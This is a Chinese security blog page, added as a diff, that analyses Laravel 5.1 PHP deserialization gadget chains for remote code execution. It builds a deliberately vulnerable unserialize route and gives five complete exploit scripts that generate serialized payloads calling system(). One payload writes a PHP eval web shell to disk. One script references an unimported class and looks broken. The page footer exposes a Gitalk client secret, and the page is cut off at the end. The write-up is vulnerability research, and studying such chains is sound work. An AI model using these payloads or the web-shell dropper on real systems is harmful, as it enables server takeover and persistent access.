@@ -1,0 +1,1092 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[Laravel5.1]反序列化链分析 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="环境搭建
+下载源码地址：https://github.com/laravel/laravel/releases/tag/v5.1.0
+github上的源码会缺少vender目录
+使用composer下载后，将vender目录拷贝到源码中
+c..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[Laravel5.1]反序列化链分析</h2>
+            <div class="post-date">2024-08-18</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/laravel51fan-xu-lie-hua-lian-fen-xi.png')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="环境搭建">环境搭建</h2>
+<p>下载源码地址：https://github.com/laravel/laravel/releases/tag/v5.1.0</p>
+<p>github上的源码会缺少vender目录</p>
+<p>使用composer下载后，将vender目录拷贝到源码中</p>
+<pre><code class="language-sh">composer create-project --prefer-dist laravel/laravel laravel5.1 &quot;5.1.*&quot;
+</code></pre>
+<p>PHP版本：<code>7.3.22</code></p>
+<p>将<code>.env.example</code>中内容复制到新建的<code>.env</code>中<br>
+设置<code>APP_ENV=local</code></p>
+<p>这样页面会显示报错信息。</p>
+<p>修改ini文件，打开openssl extension</p>
+<pre><code>extension_dir = &quot;ext&quot;
+extension=openssl
+</code></pre>
+<h2 id="入口处">入口处</h2>
+<p>使用<code>app/Http/routes.php</code>编写入口</p>
+<pre><code class="language-php">&lt;?php
+Route::get('admin/{obj}',function($s){
+    if($s){
+        unserialize(base64_decode($s));
+        return 'unserialize done'.$s;
+    }else{
+        return 'unserialize error'.$s;
+    }
+});
+</code></pre>
+<h2 id="rce1分析">RCE1分析</h2>
+<p>先全局搜索<code>function __destruct()</code><br>
+找到<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php</code></p>
+<pre><code class="language-php">&lt;?php
+public function __destruct()
+    {
+        foreach ($this-&gt;_keys as $nsKey =&gt; $null) {
+            $this-&gt;clearAll($nsKey);
+        }
+    }
+</code></pre>
+<p>每次迭代中，<code>$nsKey</code>变量会被赋值为<code>$this-&gt;_keys</code>的键，而<code>$null</code>变量在这个上下文中实际上是未使用的。</p>
+<p>继续跟进<code>clearAll()</code>函数，<code>is_file()</code>和<code>is_dir()</code>函数都会将参数当作string进行拼接处理，因为<code>$this-&gt;_path</code>可控，可以触发其他类的<code>__toString()</code>方法</p>
+<p>这里的<code>$this-&gt;_keys</code>是一个二重数组，如下所示</p>
+<pre><code>[1,[1,1]],[2,[2,2]],...
+</code></pre>
+<p>这里因为会使用<code>unlink</code>删除文件，在构造_keys的内容时，写特殊一点，以防删掉服务器文件。</p>
+<pre><code class="language-php">&lt;?php
+    /**
+     * Check if the given $itemKey exists in the namespace $nsKey.
+     *
+     * @param string $nsKey
+     * @param string $itemKey
+     *
+     * @return bool
+     */
+    public function hasKey($nsKey, $itemKey)
+    {
+        return is_file($this-&gt;_path.'/'.$nsKey.'/'.$itemKey);
+    }
+
+    /**
+     * Clear data for $itemKey in the namespace $nsKey if it exists.
+     *
+     * @param string $nsKey
+     * @param string $itemKey
+     */
+    public function clearKey($nsKey, $itemKey)
+    {
+        if ($this-&gt;hasKey($nsKey, $itemKey)) {
+            $this-&gt;_freeHandle($nsKey, $itemKey);
+            unlink($this-&gt;_path.'/'.$nsKey.'/'.$itemKey);
+        }
+    }
+    /**
+     * Clear all data in the namespace $nsKey if it exists.
+     *
+     * @param string $nsKey
+     */
+    public function clearAll($nsKey)
+    {
+        if (array_key_exists($nsKey, $this-&gt;_keys)) {
+            foreach ($this-&gt;_keys[$nsKey] as $itemKey =&gt; $null) {
+                $this-&gt;clearKey($nsKey, $itemKey);
+            }
+            if (is_dir($this-&gt;_path.'/'.$nsKey)) {
+                rmdir($this-&gt;_path.'/'.$nsKey);
+            }
+            unset($this-&gt;_keys[$nsKey]);
+        }
+    }
+</code></pre>
+<p>下一步寻找可利用<code>__toString()</code>函数的类</p>
+<p>这里可以选择<code>vendor/mockery/mockery/library/Mockery/Generator/DefinedTargetClass.php</code>中的<code>__toString()</code>方法作为触发的点，其先会调用<code>getName()</code>方法，且该方法中的<code>$this-&gt;rfc</code>是可控的，因此可以来触发一个没有<code>getName()</code>方法的类从而来触发该类中的<code>__call()</code>方法</p>
+<pre><code class="language-php">&lt;?php
+
+namespace Mockery\Generator;
+
+class DefinedTargetClass
+{
+    private $rfc;
+
+    public function __construct(\ReflectionClass $rfc)
+    {
+        $this-&gt;rfc = $rfc;
+    }
+...
+    public function getName()
+    {
+        return $this-&gt;rfc-&gt;getName();
+    }
+...
+    public function __toString()
+    {
+        return $this-&gt;getName();
+    }
+...
+</code></pre>
+<p>全局搜索<code>__call()</code>方法,跟进<code>vendor/fzaninotto/faker/src/Faker/ValidGenerator.php</code>中的<code>__call()</code>方法，其 while 语句内的<code>$this-&gt;validator</code>是可控的，当<code>$res</code>能够是命令执行函数的参数时即可触发命令执行 RCE，由于<code>$this-&gt;generator</code>也是可控的，因此可以寻找一个能够有返回参数值的方法类来达到返回命令执行函数参数的目的从而 RCE</p>
+<p><code>call_user_func()</code>函数只会返回<code>NULL</code>,所以会一直循环。设置<code>$this-&gt;maxRetries</code>来限制循环次数。</p>
+<p><a href="https://www.php.net/manual/en/function.call-user-func-array.php"><code>call_user_func_array()</code>函数使用参考</a></p>
+<pre><code class="language-php">&lt;?php
+    /**
+     * Catch and proxy all generator calls with arguments but return only valid values
+     * @param string $name
+     * @param array $arguments
+     *
+     * @return mixed
+     */
+    public function __call($name, $arguments)
+    {
+        $i = 0;
+        do {
+            $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
+            $i++;
+            if ($i &gt; $this-&gt;maxRetries) {
+                throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this-&gt;maxRetries));
+            }
+        } while (!call_user_func($this-&gt;validator, $res));
+
+        return $res;
+    }
+</code></pre>
+<p>这里可以用<code>vendor/fzaninotto/faker/src/Faker/DefaultGenerator.php</code>来做触发点，当前面设置的<code>$name</code>方法不存在时这里就会触发到<code>__call()</code>方法，从而返回可控参数<code>$this-&gt;default</code>的值，这样就可以控制<code>$res</code>参数了。</p>
+<pre><code class="language-php">&lt;?php
+
+namespace Faker;
+
+/**
+ * This generator returns a default value for all called properties
+ * and methods. It works with Faker\Generator\Base-&gt;optional().
+ */
+class DefaultGenerator
+{
+    protected $default;
+
+    public function __construct($default = null)
+    {
+        $this-&gt;default = $default;
+    }
+
+    /**
+     * @param string $attribute
+     *
+     * @return mixed
+     */
+    public function __get($attribute)
+    {
+        return $this-&gt;default;
+    }
+
+    /**
+     * @param string $method
+     * @param array $attributes
+     *
+     * @return mixed
+     */
+    public function __call($method, $attributes)
+    {
+        return $this-&gt;default;
+    }
+}
+</code></pre>
+<h2 id="exp">exp</h2>
+<pre><code class="language-php">&lt;?php
+namespace Faker{
+    class DefaultGenerator{
+        protected $default;
+        public function __construct($cmd)
+        {
+            $this-&gt;default = $cmd;
+        }
+    }
+    class ValidGenerator
+    {
+        protected $generator;
+        protected $validator;
+        protected $maxRetries;
+        public function __construct($cmd){
+            $this-&gt;generator=new DefaultGenerator($cmd);
+            $this-&gt;maxRetries=9;
+            $this-&gt;validator='system';
+        }
+    }
+}
+
+namespace Mockery\Generator{
+    use Faker\ValidGenerator;
+    class DefinedTargetClass
+    {
+        private $rfc;
+        public function __construct($cmd)
+        {
+            $this-&gt;rfc=new ValidGenerator($cmd);
+        }
+    }
+}
+
+namespace{
+    use Mockery\Generator\DefinedTargetClass;
+    class Swift_KeyCache_DiskKeyCache{
+        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
+        private $_path;
+        public function __construct($cmd){
+            $this-&gt;_path=new DefinedTargetClass($cmd);
+        }
+    }
+    echo urlencode(base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;))));
+}
+?&gt;
+</code></pre>
+<h2 id="__tostring处其他函数利用">__toString处其他函数利用</h2>
+<p>寻找其他可利用的<code>__toString()</code>函数</p>
+<p>IdenticalValueToken.php<br>
+ExactValueToken.php<br>
+中貌似可以利用</p>
+<p>主要找有两个<code>-&gt;</code>的地方，能够跳到下一段<code>_call</code>代码处。</p>
+<p>这里用<br>
+<code>vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Deprecated.php</code></p>
+<pre><code class="language-php">&lt;?php
+public function __toString() : string
+    {
+        if ($this-&gt;description) {
+            $description = $this-&gt;description-&gt;render();
+        } else {
+            $description = '';
+        }
+
+        $version = (string) $this-&gt;version;
+
+        return $version . ($description !== '' ? ($version !== '' ? ' ' : '') . $description : '');
+    }
+</code></pre>
+<h2 id="exp-2">exp</h2>
+<pre><code class="language-php">&lt;?php
+namespace Faker{
+    class DefaultGenerator{
+        protected $default;
+        public function __construct($cmd)
+        {
+            $this-&gt;default = $cmd;
+        }
+    }
+    class ValidGenerator
+    {
+        protected $generator;
+        protected $validator;
+        protected $maxRetries;
+        public function __construct($cmd){
+            $this-&gt;generator=new DefaultGenerator($cmd);
+            $this-&gt;maxRetries=9;
+            $this-&gt;validator='system';
+        }
+    }
+}
+
+namespace phpDocumentor\Reflection\DocBlock\Tags{
+    use Faker\ValidGenerator;
+    class Deprecated
+    {
+        protected $description;
+        public function __construct($cmd)
+        {
+            $this-&gt;description=new ValidGenerator($cmd);
+        }
+    }
+}
+
+namespace{
+    use phpDocumentor\Reflection\DocBlock\Tags\Deprecated;
+    class Swift_KeyCache_DiskKeyCache{
+        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
+        private $_path;
+        public function __construct($cmd){
+            $this-&gt;_path=new DefinedTargetClass($cmd);
+        }
+    }
+    echo urlencode(base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;))));
+}
+?&gt;
+</code></pre>
+<h2 id="__call处其他函数利用">__call处其他函数利用</h2>
+<p>找到<code>vendor/laravel/framework/src/Illuminate/Database/DatabaseManager.php</code><br>
+跟进<code>__call()</code>方法，其调用了<code>connection()</code>方法，跟进去，这里要让其进入<code>makeConnection()</code>方法从而来利用<code>call_user_func()</code>方法来进行RCE</p>
+<pre><code class="language-php">&lt;?php
+
+namespace Illuminate\Database;
+
+use Illuminate\Support\Arr;
+use Illuminate\Support\Str;
+use InvalidArgumentException;
+use Illuminate\Database\Connectors\ConnectionFactory;
+
+class DatabaseManager implements ConnectionResolverInterface
+{
+    /**
+     * The application instance.
+     *
+     * @var \Illuminate\Foundation\Application
+     */
+    protected $app;
+
+    /**
+     * The database connection factory instance.
+     *
+     * @var \Illuminate\Database\Connectors\ConnectionFactory
+     */
+    protected $factory;
+
+    /**
+     * The active connection instances.
+     *
+     * @var array
+     */
+    protected $connections = [];
+
+    /**
+     * The custom connection resolvers.
+     *
+     * @var array
+     */
+    protected $extensions = [];
+
+    /**
+     * Create a new database manager instance.
+     *
+     * @param  \Illuminate\Foundation\Application  $app
+     * @param  \Illuminate\Database\Connectors\ConnectionFactory  $factory
+     * @return void
+     */
+    public function __construct($app, ConnectionFactory $factory)
+    {
+        $this-&gt;app = $app;
+        $this-&gt;factory = $factory;
+    }
+
+    /**
+     * Get a database connection instance.
+     *
+     * @param  string  $name
+     * @return \Illuminate\Database\Connection
+     */
+    public function connection($name = null)
+    {
+        list($name, $type) = $this-&gt;parseConnectionName($name);
+
+        // If we haven't created this connection, we'll create it based on the config
+        // provided in the application. Once we've created the connections we will
+        // set the &quot;fetch mode&quot; for PDO which determines the query return types.
+        if (! isset($this-&gt;connections[$name])) {
+            $connection = $this-&gt;makeConnection($name);
+
+            $this-&gt;setPdoForType($connection, $type);
+
+            $this-&gt;connections[$name] = $this-&gt;prepare($connection);
+        }
+
+        return $this-&gt;connections[$name];
+    }
+
+    /**
+     * Parse the connection into an array of the name and read / write type.
+     *
+     * @param  string  $name
+     * @return array
+     */
+    protected function parseConnectionName($name)
+    {
+        $name = $name ?: $this-&gt;getDefaultConnection();
+
+        return Str::endsWith($name, ['::read', '::write'])
+                            ? explode('::', $name, 2) : [$name, null];
+    }
+
+    /**
+     * Disconnect from the given database and remove from local cache.
+     *
+     * @param  string  $name
+     * @return void
+     */
+    public function purge($name = null)
+    {
+        $this-&gt;disconnect($name);
+
+        unset($this-&gt;connections[$name]);
+    }
+
+    /**
+     * Disconnect from the given database.
+     *
+     * @param  string  $name
+     * @return void
+     */
+    public function disconnect($name = null)
+    {
+        if (isset($this-&gt;connections[$name = $name ?: $this-&gt;getDefaultConnection()])) {
+            $this-&gt;connections[$name]-&gt;disconnect();
+        }
+    }
+
+    /**
+     * Reconnect to the given database.
+     *
+     * @param  string  $name
+     * @return \Illuminate\Database\Connection
+     */
+    public function reconnect($name = null)
+    {
+        $this-&gt;disconnect($name = $name ?: $this-&gt;getDefaultConnection());
+
+        if (! isset($this-&gt;connections[$name])) {
+            return $this-&gt;connection($name);
+        }
+
+        return $this-&gt;refreshPdoConnections($name);
+    }
+
+    /**
+     * Refresh the PDO connections on a given connection.
+     *
+     * @param  string  $name
+     * @return \Illuminate\Database\Connection
+     */
+    protected function refreshPdoConnections($name)
+    {
+        $fresh = $this-&gt;makeConnection($name);
+
+        return $this-&gt;connections[$name]
+                                -&gt;setPdo($fresh-&gt;getPdo())
+                                -&gt;setReadPdo($fresh-&gt;getReadPdo());
+    }
+
+    /**
+     * Make the database connection instance.
+     *
+     * @param  string  $name
+     * @return \Illuminate\Database\Connection
+     */
+    protected function makeConnection($name)
+    {
+        $config = $this-&gt;getConfig($name);
+
+        // First we will check by the connection name to see if an extension has been
+        // registered specifically for that connection. If it has we will call the
+        // Closure and pass it the config allowing it to resolve the connection.
+        if (isset($this-&gt;extensions[$name])) {
+            return call_user_func($this-&gt;extensions[$name], $config, $name);
+        }
+
+        $driver = $config['driver'];
+
+        // Next we will check to see if an extension has been registered for a driver
+        // and will call the Closure if so, which allows us to have a more generic
+        // resolver for the drivers themselves which applies to all connections.
+        if (isset($this-&gt;extensions[$driver])) {
+            return call_user_func($this-&gt;extensions[$driver], $config, $name);
+        }
+
+        return $this-&gt;factory-&gt;make($config, $name);
+    }
+
+    /**
+     * Prepare the database connection instance.
+     *
+     * @param  \Illuminate\Database\Connection  $connection
+     * @return \Illuminate\Database\Connection
+     */
+    protected function prepare(Connection $connection)
+    {
+        $connection-&gt;setFetchMode($this-&gt;app['config']['database.fetch']);
+
+        if ($this-&gt;app-&gt;bound('events')) {
+            $connection-&gt;setEventDispatcher($this-&gt;app['events']);
+        }
+
+        // Here we'll set a reconnector callback. This reconnector can be any callable
+        // so we will set a Closure to reconnect from this manager with the name of
+        // the connection, which will allow us to reconnect from the connections.
+        $connection-&gt;setReconnector(function ($connection) {
+            $this-&gt;reconnect($connection-&gt;getName());
+        });
+
+        return $connection;
+    }
+
+    /**
+     * Prepare the read write mode for database connection instance.
+     *
+     * @param  \Illuminate\Database\Connection  $connection
+     * @param  string  $type
+     * @return \Illuminate\Database\Connection
+     */
+    protected function setPdoForType(Connection $connection, $type = null)
+    {
+        if ($type == 'read') {
+            $connection-&gt;setPdo($connection-&gt;getReadPdo());
+        } elseif ($type == 'write') {
+            $connection-&gt;setReadPdo($connection-&gt;getPdo());
+        }
+
+        return $connection;
+    }
+
+    /**
+     * Get the configuration for a connection.
+     *
+     * @param  string  $name
+     * @return array
+     *
+     * @throws \InvalidArgumentException
+     */
+    protected function getConfig($name)
+    {
+        $name = $name ?: $this-&gt;getDefaultConnection();
+
+        // To get the database connection configuration, we will just pull each of the
+        // connection configurations and get the configurations for the given name.
+        // If the configuration doesn't exist, we'll throw an exception and bail.
+        $connections = $this-&gt;app['config']['database.connections'];
+
+        if (is_null($config = Arr::get($connections, $name))) {
+            throw new InvalidArgumentException(&quot;Database [$name] not configured.&quot;);
+        }
+
+        return $config;
+    }
+
+    /**
+     * Get the default connection name.
+     *
+     * @return string
+     */
+    public function getDefaultConnection()
+    {
+        return $this-&gt;app['config']['database.default'];
+    }
+
+    /**
+     * Set the default connection name.
+     *
+     * @param  string  $name
+     * @return void
+     */
+    public function setDefaultConnection($name)
+    {
+        $this-&gt;app['config']['database.default'] = $name;
+    }
+
+    /**
+     * Register an extension connection resolver.
+     *
+     * @param  string    $name
+     * @param  callable  $resolver
+     * @return void
+     */
+    public function extend($name, callable $resolver)
+    {
+        $this-&gt;extensions[$name] = $resolver;
+    }
+
+    /**
+     * Return all of the created connections.
+     *
+     * @return array
+     */
+    public function getConnections()
+    {
+        return $this-&gt;connections;
+    }
+
+    /**
+     * Dynamically pass methods to the default connection.
+     *
+     * @param  string  $method
+     * @param  array   $parameters
+     * @return mixed
+     */
+    public function __call($method, $parameters)
+    {
+        return call_user_func_array([$this-&gt;connection(), $method], $parameters);
+    }
+}
+</code></pre>
+<p>跟进<code>getConfig()</code>方法，继续跟进<code>Arr::get($connections, $name)</code>，可以看到经过<code>get()</code>方法返回回来的<code>$config</code>的值是可控的，可以将命令执行函数返回回来，从而导致 RCE</p>
+<p>需要将<code>$this-&gt;extensions[$name]</code>赋值为<code>call_user_func</code>，<code>$config</code>赋值为<code>system</code>,<code>$name</code>赋值为<code>id</code>(即$payload)</p>
+<p>往上查看<code>$name</code>参数传递过程</p>
+<pre><code>list($name, $type) = $this-&gt;parseConnectionName($name);
+</code></pre>
+<p>继续跟进<code>parseConnectionName()</code>函数</p>
+<pre><code>protected function parseConnectionName($name)
+    {
+        $name = $name ?: $this-&gt;getDefaultConnection();
+
+        return Str::endsWith($name, ['::read', '::write'])
+                            ? explode('::', $name, 2) : [$name, null];
+    }
+</code></pre>
+<p>继续跟进<code>getDefaultConnection()</code>函数</p>
+<pre><code>public function getDefaultConnection()
+    {
+        return $this-&gt;app['config']['database.default'];
+    }
+</code></pre>
+<p>可以看到直接赋值<code>$this-&gt;app['config']['database.default']=$payload</code>就可以了,上一个函数对<code>::</code>进行分割，所以设置参数时也可以加<code>::</code>,虽然没啥用😅</p>
+<p>继续看<code>$config</code>参数</p>
+<pre><code>$config = $this-&gt;getConfig($name);
+</code></pre>
+<p>跟进<code>getConfig()</code>函数</p>
+<pre><code>protected function getConfig($name)
+    {
+        $name = $name ?: $this-&gt;getDefaultConnection();
+
+        // To get the database connection configuration, we will just pull each of the
+        // connection configurations and get the configurations for the given name.
+        // If the configuration doesn't exist, we'll throw an exception and bail.
+        $connections = $this-&gt;app['config']['database.connections'];
+
+        if (is_null($config = Arr::get($connections, $name))) {
+            throw new InvalidArgumentException(&quot;Database [$name] not configured.&quot;);
+        }
+
+        return $config;
+    }
+</code></pre>
+<p>继续跟进<code>Arr::get</code></p>
+<pre><code>public static function get($array, $key, $default = null)
+    {
+        if (is_null($key)) {
+            return $array;
+        }
+
+        if (isset($array[$key])) {
+            return $array[$key];
+        }
+        ...
+</code></pre>
+<p>因为<code>$name</code>已经被我们赋值了，所以设置<code>$this-&gt;app['config']['database.connections'] = [$payload =&gt; 'system']</code><br>
+<code>$this-&gt;extensions[$payload]='call_user_func';</code><br>
+这样就构造完成了。</p>
+<h2 id="exp-3">exp</h2>
+<pre><code class="language-php">&lt;?php
+namespace Illuminate\Database{
+    class DatabaseManager{
+        protected $app;
+        protected $extensions ;
+        public function __construct($payload)
+        {
+            $this-&gt;app['config']['database.default'] = $payload;
+            $this-&gt;app['config']['database.connections'] = [$payload =&gt; 'system'];
+            $this-&gt;extensions[$payload]='call_user_func';
+        }
+    }
+}
+
+namespace phpDocumentor\Reflection\DocBlock\Tags{
+    use Illuminate\Database\DatabaseManager;
+    class Deprecated
+    {
+        protected $description;
+        public function __construct($payload)
+        {
+            $this-&gt;description=new DatabaseManager($payload);
+        }
+    }
+}
+
+namespace {
+    use phpDocumentor\Reflection\DocBlock\Tags\Deprecated;
+    class Swift_KeyCache_DiskKeyCache {
+        private $_path;
+        private $_keys = ['fallingskies' =&gt; ['fallingskies' =&gt; 'fallingskies']];
+        public function __construct($payload) {
+            $this-&gt;_path = new Deprecated($payload);
+        }
+    }
+    echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;echo 'PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=='|base64 -d &gt; 1.php&quot;)));
+}
+?&gt;
+</code></pre>
+<p>命令执行成功后，会有报错信息<br>
+<img src="https://fallingskies22.github.io/post-images/1724071508888.png" alt="" loading="lazy"></p>
+<h2 id="另一条">另一条</h2>
+<p>分析就省略了，就是改了__tostring和__call<br>
+这里注意调用__call时是能带入参数的，这里</p>
+<pre><code>$method=stringfy
+$attributes=$this-&gt;value
+</code></pre>
+<pre><code class="language-php">&lt;?php 
+namespace Faker {
+    class Generator {
+        protected $formatters = array();
+        function __construct() {
+            $this-&gt;formatters = ['stringify' =&gt; &quot;system&quot;];
+        }
+    }
+}
+
+namespace Prophecy\Argument\Token {
+    use Faker\Generator;
+    class ExactValueToken {
+        private $string;
+        private $value;
+        private $util;
+        public function __construct($payload) {
+            $this-&gt;string = null;
+            $this-&gt;util = new Generator();;
+            $this-&gt;value = $payload;
+        }
+    }
+}
+
+namespace {
+    use Prophecy\Argument\Token\ExactValueToken;
+    class Swift_KeyCache_DiskKeyCache {
+        private $path;
+        private $keys = ['fallingskies' =&gt; ['fallingskies' =&gt; 'fallingskies']];
+        public function __construct($payload) {
+            $this-&gt;path = new ExactValueToken($payload);
+        }
+    }
+    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;)));
+}
+?&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1724118558197.png" alt="" loading="lazy"></figure>
+<p>但是测试发现<code>Generator</code>中的<code>__call</code>利用不了，因为已经修复了<br>
+<code>$this-&gt;formatters</code>会清空，导致后面利用参数链断裂。</p>
+<pre><code>public function __wakeup()
+    {
+        $this-&gt;formatters = [];
+    }
+</code></pre>
+<h2 id="另另一条">另另一条</h2>
+<p><code>vendor/laravel/framework/src/Illuminate/Validation/Validator.php</code></p>
+<pre><code>public function __call($method, $parameters)
+    {
+        $rule = Str::snake(substr($method, 8));
+        echo $rule;
+        if (isset($this-&gt;extensions[$rule])) {
+            return $this-&gt;callExtension($rule, $parameters);
+        }
+
+        throw new BadMethodCallException(&quot;Method [$method] does not exist.&quot;);
+    }
+</code></pre>
+<p>跟进<code>src/Illuminate/Validation/Validator.php</code>中的<code>__call()</code>方法，先进行字符串的操作截取<code>$method</code>第八个字符之后的字符，由于传入的字符串是<code>dispatch</code>，正好八个字符所以传入后为空，接着调用<code>callExtension()</code>方法，通过<code>instanceof Closure</code>判断，触发call_user_func_array方法<br>
+<img src="https://fallingskies22.github.io/post-images/1724126866932.png" alt="" loading="lazy"></p>
+<p>exp</p>
+<pre><code class="language-php">&lt;?php
+namespace Illuminate\Validation {
+    class Validator {
+       public $extensions = [];
+       public function __construct() {
+            $this-&gt;extensions = ['' =&gt; 'system'];
+       }
+    }
+}
+
+namespace Illuminate\Broadcasting {
+    use  Illuminate\Validation\Validator;
+    class PendingBroadcast {
+        protected $events;
+        protected $event;
+        public function __construct($cmd)
+        {
+            $this-&gt;events = new Validator();
+            $this-&gt;event = $cmd;
+        }
+    }
+    echo base64_encode(serialize(new PendingBroadcast('calc')));
+}
+?&gt;
+</code></pre>
+<p>但是<code>PendingBroadcast</code>这个类没有了，我们需要找另一个符合要求的类，很难（这里没找到）。<br>
+看下能否利用<code>callClassBasedExtension</code>方法。</p>
+<p>可以看到，我们用上面的<code>DefaultGenerator</code>方法，可以控制<code>$this-&gt;container-&gt;make($class)</code>的值，然后<code>$method</code>我们也可以通过<code>$callback</code>参数控制，<code>$parameters</code>参数也是可控的</p>
+<p>但是因为这里使用的数组形式，所以我们要找可以利用的<code>$this-&gt;container-&gt;make($class)-&gt;$method($parmeters)</code></p>
+<pre><code>    /**
+     * Call a class based validator extension.
+     *
+     * @param  string  $callback
+     * @param  array   $parameters
+     * @return bool
+     */
+    protected function callClassBasedExtension($callback, $parameters)
+    {
+        list($class, $method) = explode('@', $callback);
+
+        return call_user_func_array([$this-&gt;container-&gt;make($class), $method], $parameters);
+    }
+</code></pre>
+<p>这里找到<code>DebugClassLoader</code>的<code>loadClass</code>方法</p>
+<pre><code>public function loadClass($class)
+    {
+        ErrorHandler::stackErrors();
+
+        try {
+            echo &quot;loooooooadclass&quot;;
+            if ($this-&gt;isFinder &amp;&amp; !isset($this-&gt;loaded[$class])) {
+                $this-&gt;loaded[$class] = true;
+                if ($file = $this-&gt;classLoader[0]-&gt;findFile($class)) {
+                    require $file;
+                }
+            } else {
+                echo &quot;sssssssssssucccesss&quot;;
+                call_user_func($this-&gt;classLoader, $class);
+                $file = false;
+            }
+        } catch (\Exception $e) {
+            ErrorHandler::unstackErrors();
+
+            throw $e;
+        } catch (\Throwable $e) {
+            ErrorHandler::unstackErrors();
+
+            throw $e;
+        }
+</code></pre>
+<p>编写exp</p>
+<pre><code class="language-php">&lt;?php
+namespace{
+    use Prophecy\Argument\Token\ObjectStateToken;
+    class Swift_KeyCache_DiskKeyCache{
+        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
+        private $_path;
+        public function __construct($cmd){
+            $this-&gt;_path=new ObjectStateToken($cmd);
+        }
+    }
+    echo urlencode(base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;calc&quot;))));
+}
+namespace Prophecy\Argument\Token{
+    use Illuminate\Validation\Validator;
+    class ObjectStateToken{
+        private $name;
+        private $value;
+        private $util;
+        public function __construct($cmd){
+            $this-&gt;name='';
+            $this-&gt;value=$cmd;
+            $this-&gt;util=new Validator();
+        }
+    }
+}
+
+namespace Illuminate\Validation{
+    use Faker\DefaultGenerator;
+    class Validator{
+        protected $container;
+        protected $extensions = [];
+        public function __construct(){
+            $this-&gt;extensions['y']='xxx@loadClass';
+            $this-&gt;container=new DefaultGenerator();
+        }
+    }
+}
+namespace Faker{
+    use Symfony\Component\Debug\DebugClassLoader;
+    class DefaultGenerator
+    {
+        protected $default;
+
+        public function __construct()
+        {
+            $this-&gt;default = new DebugClassLoader();
+        }
+    }
+}
+
+namespace Symfony\Component\Debug{
+    class DebugClassLoader
+    {
+
+        private $classLoader;
+        public function __construct()
+        {
+            $this-&gt;classLoader = &quot;system&quot;;
+        }
+    }
+}
+?&gt;
+</code></pre>
+<h2 id="参考文章">参考文章</h2>
+<p>https://www.anquanke.com/post/id/258264#h3-11</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowlaravel-zhuan-ti/">
+                  <h3 class="post-title">
+                    [ctfshow]Laravel专题
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
